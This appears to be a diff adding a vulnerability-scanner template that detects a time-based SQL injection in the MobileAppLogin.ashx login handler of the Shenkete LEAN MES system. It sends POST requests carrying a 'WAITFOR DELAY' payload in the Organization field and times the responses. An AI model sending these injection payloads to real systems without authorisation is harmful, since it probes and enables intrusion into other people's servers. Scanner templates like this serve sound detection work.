@@ -1,0 +1,37 @@
+id: shenkete-MobileAppLogin-sql
+
+info:
+  name: 深科特 LEAN MES系统 MobileAppLogin.ashx SQL注入漏洞
+  author: shenkete
+  severity: high
+  tags: shenkete
+
+http:
+  - raw:
+      - |
+        POST /Handler/MobileAppLogin.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Content-Type: application/x-www-form-urlencoded
+
+        Action=checkmesurl&Organization='WAITFOR DELAY'0:0:2'--
+
+      - |
+        POST /Handler/MobileAppLogin.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Content-Type: application/x-www-form-urlencoded
+
+        Action=checkmesurl&Organization='WAITFOR DELAY'0:0:4'--
+    
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
+      - type: dsl
+        dsl:
+          - 'duration_1>=2 && duration_1<4'  
+          - 'duration_2>=4 && duration_2<6'
+        condition: and
